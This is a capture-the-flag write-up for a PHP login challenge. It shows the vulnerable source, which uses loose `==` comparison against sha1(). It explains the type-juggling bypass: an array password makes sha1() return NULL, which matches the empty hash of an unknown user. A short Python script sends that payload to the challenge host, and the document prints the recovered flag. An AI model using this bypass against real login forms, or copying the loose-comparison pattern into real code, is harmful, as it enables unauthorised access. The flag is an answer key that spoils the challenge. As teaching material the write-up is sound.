# PHP Login

Tag: `Language Feature`

[http://h4ck3r.quest:8081](http://h4ck3r.quest:8081)

## Writeup

The source is give:

```php
<?php
// BSides Ahmedabad CTF 2021: entrance

include 'flag.php';
$users = array(
    "admin" => "ed2b7b57b3b5be3e8d4246c69e4b513608ffb352",
    "guest" => "35675e68f4b5af7b995d9205ad0fc43842f16450"
);

function lookup($username) {
    global $users;
    return array_key_exists($username, $users) ? $users[$username] : "";
}

if (!empty($_POST['username']) && !empty($_POST['password'])) {
    $sha1pass = lookup($_POST['username']);
    if ($sha1pass == sha1($_POST['password'])) {
        if ($_POST['username'] !== 'guest') echo $FLAG;
        else echo 'Welcome guest!';
    } else {
        echo 'Login Failed!';
    }
} else {
    echo "You can login with guest:guest";
}
echo "<br>\n";
highlight_file(__file__);
?>
```

We cannot crack admin's password easily.

`$sha1pass == sha1($_POST['password'])` has loose comparison, we can use php type juggling.

After [some research](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#null-statements), we found out that we can `sha1` an array and get `NULL`. And `NULL` is very "powerful" in type juggling.

By looking up the table we see that `NULL == ""` is true. So that's it.

```python
#!/usr/bin/env python3
# -* coding: utf-8 -*-
# By TWNWAKing
import requests
import re

url = "http://h4ck3r.quest:8081/"
regex = "FLAG\{[^\}]+\}"
r = requests.post(
    url, data={"username": '"not_admin"', "password[]": "'magic'"}
)  # What the hell...
print(re.findall(regex, r.text)[0])
# FLAG{ez_php_weak_type}
```
